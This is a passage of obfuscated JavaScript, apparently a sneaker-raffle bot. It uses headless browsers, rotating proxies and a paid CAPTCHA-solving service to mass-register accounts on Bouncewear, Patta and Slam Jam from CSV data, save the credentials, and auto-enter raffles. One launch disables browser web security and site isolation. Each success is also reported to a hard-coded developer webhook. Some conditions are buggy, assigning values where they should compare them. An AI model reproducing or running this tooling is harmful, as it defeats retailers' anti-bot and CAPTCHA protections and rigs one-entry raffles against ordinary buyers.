            var _0xc8803f = Math['round'](Math['random']() * (_0x3e167a()['length'] - 0x1)), _0x393e08 = _0x3e167a()[_0xc8803f]['split'](':');
        const _0x45c819 = await _0x149082['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x393e08[0x0] + ':' + _0x393e08[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x203047 = await _0x45c819['newPage']();
            await _0x203047['authenticate']({
                'username': '' + _0x393e08[0x2],
                'password': '' + _0x393e08[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x525a66['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x203047['setRequestInterception'](!![]), _0x203047['on']('request', _0x3c35e9 => {
                _0x3c35e9['resourceType']() === 'image' || _0x3c35e9['resourceType']() === 'font' || _0x3c35e9['resourceType']() === 'media' ? _0x3c35e9['abort']() : _0x3c35e9['continue']();
            }), await _0x203047['goto'](_0x483451), await _0x29ac01(0xbb8), await _0x203047['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x91a29b() + '\x20[' + _0x525a66['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Filling\x20information'), await _0x203047['type']('#RegisterForm-FirstName', '' + bouncewear[_0x356c89]['FirstName']), await _0x29ac01(0x226), await _0x203047['type']('#RegisterForm-LastName', '' + bouncewear[_0x356c89]['LastName']), await _0x29ac01(0x226), await _0x203047['type']('#RegisterForm-email', '' + bouncewear[_0x356c89]['Email']), await _0x29ac01(0x226), await _0x203047['type']('#RegisterForm-password', '' + bouncewear[_0x356c89]['Password']), await _0x29ac01(0x226), await _0x203047['click']('#marketing'), console['log'](_0x91a29b() + '\x20[' + _0x525a66['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Submitting..'), await _0x203047['$eval']('#RegisterForm', _0x1ec4ee => _0x1ec4ee['submit']()), await _0x29ac01(0x1f40), console['log'](_0x91a29b() + '\x20[' + _0x525a66['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x203047['solveRecaptchas'](), await _0x203047['click']('.shopify-challenge__button.btn');
            async function _0x4bce35() {
                for (var _0xecb65d = 0x0; _0xecb65d < 0x4; _0xecb65d++) {
                    try {
                        console['log']('try'), await _0x203047['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x91a29b() + '\x20[' + _0x525a66['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20' + _0x3e6680['red']('Catpcha\x20failed,\x20retrying..')), await _0x203047['solveRecaptchas'](), await _0x203047['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x4bce35(), console['log'](_0x91a29b() + '\x20[' + _0x525a66['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x29ac01(0x1f4);
            try {
                await _0x203047['waitForSelector']('.featured-title'), await _0x29ac01(0x1f4), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x525a66['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x356c89]['Email'] + '\x20Generated!')), _0x45be1e['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x356c89]['Email'] + ',' + bouncewear[_0x356c89]['Password']), console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x525a66['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x356c89]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x340547) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x340547));
            }
        } catch (_0x4b15e0) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x356c89 + 0x1) + '\x20:\x20' + _0x4b15e0));
        } finally {
            _0x45c819 && _0x45c819['close'](), console['log']('Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x4d4147(_0x2c19c1, _0x6aedf6, _0x381030, _0x17e628) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x46b3c1 = 0x0; _0x46b3c1 < _0x381030['length']; _0x46b3c1++) {
        var _0x3e6d4b = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0xf76913
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x582dcf
                }
            ]
        }];
        const _0xc84790 = { 'embeds': _0x3e6d4b };
        _0x757e32(_0x6aedf6['name'] + '\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20/\x20' + _0x381030['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83), await _0x43304e(_0x381030, _0x46b3c1);
        var _0x2fba49 = await _0x2463d6(_0x381030[_0x46b3c1], _0x6aedf6, 'acc', ![]);
        const _0x20c617 = { 'succesDEVMSG': { 'embeds': [_0x2fba49] } };
        if (_0x381030[_0x46b3c1]['Email'] == '' || _0x381030[_0x46b3c1]['FirstName'] == '' || _0x381030[_0x46b3c1]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x29ac01(0x7d0);
            continue;
        }
        (_0x381030[_0x46b3c1]['Password'] == '' || _0x381030[_0x46b3c1] == undefined) && _0x381030[_0x46b3c1]['Password'] == 'JRaffles23!';
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x1e7003 = _0x17e628[_0x46b3c1]['split'](':');
        else
            var _0x5b687f = Math['round'](Math['random']() * (_0x17e628['length'] - 0x1)), _0x1e7003 = _0x17e628[_0x5b687f]['split'](':');
        const _0x4017f0 = await _0x149082['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1e7003[0x0] + ':' + _0x1e7003[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x391280 = await _0x4017f0['newPage']();
            await _0x391280['authenticate']({
                'username': '' + _0x1e7003[0x2],
                'password': '' + _0x1e7003[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x6aedf6['name'] + ']\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x391280['setRequestInterception'](!![]), _0x391280['on']('request', _0x5e1fbc => {
                _0x5e1fbc['resourceType']() === 'image' || _0x5e1fbc['resourceType']() === 'font' || _0x5e1fbc['resourceType']() === 'media' ? _0x5e1fbc['abort']() : _0x5e1fbc['continue']();
            }), await _0x391280['goto'](_0x2c19c1), await _0x29ac01(0xbb8), await _0x391280['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x91a29b() + '\x20[' + _0x6aedf6['name'] + ']\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20:\x20Filling\x20information'), await _0x391280['type']('#RegisterForm-FirstName', '' + _0x381030[_0x46b3c1]['FirstName']), await _0x29ac01(0x226), await _0x391280['type']('#RegisterForm-LastName', '' + _0x381030[_0x46b3c1]['LastName']), await _0x29ac01(0x226), await _0x391280['type']('#RegisterForm-email', '' + _0x381030[_0x46b3c1]['Email']), await _0x29ac01(0x226), await _0x391280['type']('#RegisterForm-password', '' + _0x381030[_0x46b3c1]['Password']), await _0x29ac01(0x226), console['log'](_0x91a29b() + '\x20[' + _0x6aedf6['name'] + ']\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20:\x20Submitting..'), await _0x391280['$eval']('#RegisterForm', _0x12f5f7 => _0x12f5f7['submit']()), await _0x29ac01(0x1f40);
            try {
                await _0x391280['waitForSelector']('.home-page-grid__collection'), await _0x29ac01(0x1f4), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x6aedf6['name'] + ']\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20:\x20Account\x20' + _0x381030[_0x46b3c1]['Email'] + '\x20Generated!')), _0x45be1e['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x381030[_0x46b3c1]['Email'] + ',' + _0x381030[_0x46b3c1]['Password']), console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x6aedf6['name'] + ']\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20:\x20Account\x20' + _0x381030[_0x46b3c1]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x20c617['succesDEVMSG']);
                } catch {
                }
                await _0x31fc49(_0x201dd3, _0x20c617['succesDEVMSG']);
            } catch (_0x1c1859) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1c1859));
            }
        } catch (_0x182f4d) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x46b3c1 + 0x1) + '\x20:\x20' + _0x182f4d));
        } finally {
            _0x4017f0 && _0x4017f0['close'](), console['log']('Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x5e0b69(_0x14230c, _0x1d57c3, _0x132b12, _0x2e2a6c) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x11a720 = 0x0; _0x11a720 < _0x132b12['length']; _0x11a720++) {
        var _0x4a0954;
        if (_0x56f0b2 != 'yes')
            var _0x56f0b2 = '', _0x1660bd = 0x0;
        _0x757e32(_0x1d57c3['name'] + '\x20Task\x20' + (_0x11a720 + 0x1) + '\x20/\x20' + _0x132b12['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83), await _0x43304e(_0x132b12, _0x11a720);
        if (_0x132b12[_0x11a720]['Email'] == '' || _0x132b12[_0x11a720]['Password'] == '' || _0x132b12[_0x11a720]['FirstName'] == '' || _0x132b12[_0x11a720]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x3921a2 = _0x2e2a6c[_0x11a720]['split'](':');
        else
            var _0x5cdebe = Math['round'](Math['random']() * (_0x2e2a6c['length'] - 0x1)), _0x3921a2 = _0x2e2a6c[_0x5cdebe]['split'](':');
        const _0x3dd152 = await _0x149082['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3921a2[0x0] + ':' + _0x3921a2[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x40c29b = await _0x3dd152['newPage']();
            await _0x40c29b['authenticate']({
                'username': '' + _0x3921a2[0x2],
                'password': '' + _0x3921a2[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x40c29b['setRequestInterception'](!![]), _0x40c29b['on']('request', _0x1a820b => {
                _0x1a820b['resourceType']() === 'image' || _0x1a820b['resourceType']() === 'font' || _0x1a820b['resourceType']() === 'media' ? _0x1a820b['abort']() : _0x1a820b['continue']();
            }), await _0x40c29b['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x40c29b['waitForSelector']('#CustomerEmail'), console['log'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x40c29b['type']('#CustomerEmail', '' + _0x132b12[_0x11a720]['Email']), await _0x29ac01(0x12c), await _0x40c29b['type']('#CustomerPassword', '' + _0x132b12[_0x11a720]['Password']), await _0x29ac01(0x226), await _0x40c29b['$eval']('#customer_login', _0x38027 => _0x38027['submit']());
            try {
                await _0x40c29b['waitForSelector']('#orders'), await _0x29ac01(0x4b0);
            } catch {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x40c29b['goto']('' + _0x132b12[_0x11a720]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x29ac01(0xbb8), console['log'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x40c29b['waitForSelector']('#email');
            } catch {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x40c29b['type']('#email', '' + _0x132b12[_0x11a720]['Email']), await _0x29ac01(0x384), await _0x40c29b['type']('#first_name', '' + _0x132b12[_0x11a720]['FirstName']), await _0x29ac01(0x514), await _0x40c29b['type']('#last_name', '' + _0x132b12[_0x11a720]['LastName']), await _0x29ac01(0x514), await _0x40c29b['type']('#street_address', _0x132b12[_0x11a720]['Address1'] + '\x20' + _0x132b12[_0x11a720]['HouseNumber'] + '\x20' + _0x132b12[_0x11a720]['Address2']), await _0x29ac01(0x2bc);
            _0x132b12[_0x11a720]['Postcode'] == undefined && (_0x132b12[_0x11a720]['Postcode'] = _0x132b12[_0x11a720]['Zip']);
            await _0x40c29b['type']('#zip_code', '' + _0x132b12[_0x11a720]['Postcode']), await _0x29ac01(0x320), await _0x40c29b['type']('#city', '' + _0x132b12[_0x11a720]['City']), await _0x29ac01(0x320), await _0x40c29b['type']('#bday', '01/01/1994'), await _0x29ac01(0x320), await _0x40c29b['type']('#instagram', '' + _0x132b12[_0x11a720]['Follower']), await _0x29ac01(0x352);
            if (_0x132b12[_0x11a720]['Size'] == 'RANDOM') {
                const _0x2130e6 = await _0x40c29b['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x230df5 => {
                    return _0x230df5['map'](_0x277723 => _0x277723['textContent']);
                });
                var _0x8180c1 = Math['round'](Math['random']() * (_0x2130e6['length'] - 0x1));
                console['log'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x2130e6[_0x8180c1]), await _0x40c29b['click']('label[data-eu-size=\x22' + _0x2130e6[_0x8180c1] + '\x22]');
            } else {
                console['log'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x132b12[_0x11a720]['Size']);
                try {
                    await _0x40c29b['click']('label[data-eu-size=\x22' + _0x132b12[_0x11a720]['Size'] + '\x22]');
                } catch {
                    await _0x40c29b['click']('label[data-eu-size=\x22' + _0x132b12[_0x11a720]['Size'] + '.0\x22]');
                }
            }
            await _0x29ac01(0xbb8), await _0x40c29b['$$eval']('.raffle__checkbox-label', _0x1d1e73 => _0x1d1e73['forEach'](_0x1af2b8 => _0x1af2b8['click']())), await _0x29ac01(0x7d0), console['log'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x40c29b['click']('#raffle__form-submit'), await _0x29ac01(0x1388);
            try {
                await _0x40c29b['waitForSelector']('#raffle__confirmation-message-container'), _0x56f0b2 = 'no', _0x4cb72b(_0x132b12[_0x11a720], _0x1d57c3), console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x58cf51) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x58cf51));
            }
        } catch (_0x195cb1) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20' + _0x195cb1)), _0x56f0b2 = 'yes';
        } finally {
            _0x3dd152 && _0x3dd152['close']();
            if (_0x56f0b2 == 'yes' && _0x1660bd != 0x5 && _0x4a0954 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x1d57c3['name'] + ']\x20Task\x20' + (_0x11a720 + 0x1) + '\x20:\x20Retrying')), _0x11a720 = _0x11a720 - 0x1, _0x1660bd = _0x1660bd + 0x1;
                continue;
            }
            _0x56f0b2 == 'yes' && _0x1660bd >= 0x5 && (_0x29520a(_0x132b12[_0x11a720], _0x1d57c3), _0x56f0b2 = 'no', _0x1660bd = 0x0), console['log']('Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0xa5005b(_0x5dbb82, _0x5564ff, _0x16414e, _0x5df9ce) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xc994a8 = 0x0; _0xc994a8 < _0x16414e['length']; _0xc994a8++) {
        if (_0x11d7e0 != 'yes')
            var _0x11d7e0 = '', _0x9821f0 = 0x0;
        var _0xec5bf7 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0xf76913
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x2cde8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x582dcf
                }
            ]
        }];
        const _0x467bea = { 'embeds': _0xec5bf7 };
        _0x757e32(_0x5564ff['name'] + '\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20/\x20' + _0x16414e['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83), await _0x43304e(_0x16414e, _0xc994a8);
        var _0x16f348 = await _0x2463d6(_0x16414e[_0xc994a8], _0x5564ff, 'acc', ![]);
        const _0x52dd89 = { 'succesDEVMSG': { 'embeds': [_0x16f348] } };
        if (_0x16414e[_0xc994a8]['Email'] == '' || _0x16414e[_0xc994a8]['FirstName'] == '' || _0x16414e[_0xc994a8]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x29ac01(0x7d0);
            continue;
        }
        (_0x16414e[_0xc994a8]['Password'] == '' || _0x16414e[_0xc994a8] == undefined) && _0x16414e[_0xc994a8]['Password'] == 'JRaffles23!';
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x4e0599 = _0x5df9ce[_0xc994a8]['split'](':');
        else
            var _0x21c2ba = Math['round'](Math['random']() * (_0x5df9ce['length'] - 0x1)), _0x4e0599 = _0x5df9ce[_0x21c2ba]['split'](':');
        const _0xc67343 = await _0x149082['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4e0599[0x0] + ':' + _0x4e0599[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x345ea2 = await _0xc67343['newPage']();
            await _0x345ea2['authenticate']({
                'username': '' + _0x4e0599[0x2],
                'password': '' + _0x4e0599[0x3]
            }), console['log'](_0x91a29b() + '\x20[' + _0x5564ff['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x345ea2['setRequestInterception'](!![]), _0x345ea2['on']('request', _0x2b7a78 => {
                _0x2b7a78['resourceType']() === 'image' || _0x2b7a78['resourceType']() === 'font' || _0x2b7a78['resourceType']() === 'media' ? _0x2b7a78['abort']() : _0x2b7a78['continue']();
            }), await _0x345ea2['goto']('https://drop.slamjam.com/account/register'), await _0x29ac01(0xbb8), await _0x345ea2['waitForSelector']('#FirstName'), await _0x345ea2['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x345ea2['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x91a29b() + '\x20[' + _0x5564ff['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Filling\x20information'), await _0x29ac01(0x4b0), await _0x345ea2['type']('#FirstName', '' + _0x16414e[_0xc994a8]['FirstName']), await _0x29ac01(0x226), await _0x345ea2['type']('#LastName', '' + _0x16414e[_0xc994a8]['LastName']), await _0x29ac01(0x226), await _0x345ea2['type']('#Email', '' + _0x16414e[_0xc994a8]['Email']), await _0x29ac01(0x2ee), await _0x345ea2['type']('#ConfirmEmail', '' + _0x16414e[_0xc994a8]['Email']), await _0x29ac01(0x2ee), await _0x345ea2['type']('#CreatePassword', '' + _0x16414e[_0xc994a8]['Password']), await _0x29ac01(0x2ee), await _0x345ea2['type']('#CreateConfirmPassword', '' + _0x16414e[_0xc994a8]['Password']), await _0x29ac01(0x226), console['log'](_0x91a29b() + '\x20[' + _0x5564ff['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Submitting..'), await _0x345ea2['$eval']('#create_customer', _0x5c3407 => _0x5c3407['submit']()), await _0x29ac01(0x1388), console['log'](_0x91a29b() + '\x20[' + _0x5564ff['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20' + _0x3e6680['cyan']('Solving\x20Captcha')), await _0x345ea2['solveRecaptchas'](), console['log'](_0x91a29b() + '\x20[' + _0x5564ff['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x345ea2['$eval']('.shopify-challenge__container\x20>\x20form', _0x10bc73 => _0x10bc73['submit']());
            try {
                await _0x345ea2['waitForSelector']('.product-card__image'), await _0x29ac01(0x1f4), _0x11d7e0 = 'no', console['log'](_0x3e6680['green'](_0x91a29b() + '\x20[' + _0x5564ff['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Account\x20' + _0x16414e[_0xc994a8]['Email'] + '\x20Generated!')), _0x45be1e['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x16414e[_0xc994a8]['Email'] + ',' + _0x16414e[_0xc994a8]['Password']), console['log'](_0x3e6680['yellow'](_0x91a29b() + '\x20[' + _0x5564ff['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Account\x20' + _0x16414e[_0xc994a8]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x2cde8d['webhook'] != undefined && _0x2cde8d['webhook'] != '' && await _0x31fc49(_0x2cde8d['webhook'], _0x52dd89['succesDEVMSG']);
                } catch {
                }
                await _0x31fc49(_0x201dd3, _0x52dd89['succesDEVMSG']);
            } catch (_0x3ae956) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3ae956));
            }
        } catch (_0x39b2b3) {
            console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x7d2206[taskModule]['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20' + _0x39b2b3));
        } finally {
            _0xc67343 && _0xc67343['close']();
            if (_0x11d7e0 == 'yes' && _0x9821f0 != 0x5) {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x5564ff['name'] + ']\x20Task\x20' + (_0xc994a8 + 0x1) + '\x20:\x20Retrying')), _0xc994a8 = _0xc994a8 - 0x1, _0x9821f0 = _0x9821f0 + 0x1;
                continue;
            }
            _0x11d7e0 == 'yes' && _0x9821f0 >= 0x5 && (_0x29520a(_0x16414e[_0xc994a8], _0x5564ff), _0x11d7e0 = 'no', _0x9821f0 = 0x0), console['log']('Waiting\x20for\x20' + _0x2cde8d['delay'] + '\x20ms'), await _0x29ac01(_0x2cde8d['delay']);
        }
    }
}
async function _0x78ac52(_0x257db0, _0x10f948, _0x4cf783, _0x2db710) {
    _0x149082['use'](_0x6d9f88()), _0x149082['use'](_0x3fe2cb({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x2cde8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x3b2423 = 0x0; _0x3b2423 < _0x4cf783['length']; _0x3b2423++) {
        var _0x43a42d;
        if (_0x1a303a != 'yes')
            var _0x1a303a = '', _0x3eca25 = 0x0;
        _0x757e32(_0x10f948['name'] + '\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20/\x20' + _0x4cf783['length'] + '\x20||\x20File:\x20' + _0x10012e + '\x20Proxies:\x20' + _0x598b83), await _0x43304e(_0x4cf783, _0x3b2423);
        if (_0x4cf783[_0x3b2423]['Email'] == '' || _0x4cf783[_0x3b2423]['Password'] == '' || _0x4cf783[_0x3b2423]['FirstName'] == '' || _0x4cf783[_0x3b2423]['LastName'] == '') {
            console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x2cde8d['useRandomProxy'] = ![])
            var _0x38ae8 = _0x2db710[_0x3b2423]['split'](':');
        else
            var _0x324cd6 = Math['round'](Math['random']() * (_0x2db710['length'] - 0x1)), _0x38ae8 = _0x2db710[_0x324cd6]['split'](':');
        const _0x49b53f = await _0x149082['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x38ae8[0x0] + ':' + _0x38ae8[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x5dfa0a = await _0x49b53f['newPage']();
            await _0x5dfa0a['authenticate']({
                'username': '' + _0x38ae8[0x2],
                'password': '' + _0x38ae8[0x3]
            }), await _0x5dfa0a['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5dfa0a['setRequestInterception'](!![]), _0x5dfa0a['on']('request', _0x441da9 => {
                _0x441da9['resourceType']() === 'image' || _0x441da9['resourceType']() === 'font' || _0x441da9['resourceType']() === 'media' ? _0x441da9['abort']() : _0x441da9['continue']();
            }), await _0x5dfa0a['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x5dfa0a['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5dfa0a['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x29ac01(0x258), await _0x5dfa0a['waitForSelector']('#CustomerEmail'), console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5dfa0a['type']('#CustomerEmail', '' + _0x4cf783[_0x3b2423]['Email']), await _0x29ac01(0x12c), await _0x5dfa0a['type']('#CustomerPassword', '' + _0x4cf783[_0x3b2423]['Password']), await _0x29ac01(0x226), await _0x5dfa0a['$eval']('#customer_login', _0x28ab88 => _0x28ab88['submit']()), await _0x29ac01(0x7d0), await _0x5dfa0a['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20' + _0x3e6680['cyan']('Solving\x20Captcha')), await _0x5dfa0a['solveRecaptchas'](), console['log'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x5dfa0a['$eval']('.shopify-challenge__container\x20>\x20form', _0x3277a4 => _0x3277a4['submit']());
            try {
                await _0x5dfa0a['waitForSelector']('.nav-account'), await _0x29ac01(0x4b0);
            } catch {
                console['log'](_0x3e6680['red'](_0x91a29b() + '\x20[' + _0x10f948['name'] + ']\x20Task\x20' + (_0x3b2423 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x5dfa0a['goto']('' + _0x4cf783[_0x3b2423]['Url'], {
                'waitUntil': 'networkidle2',
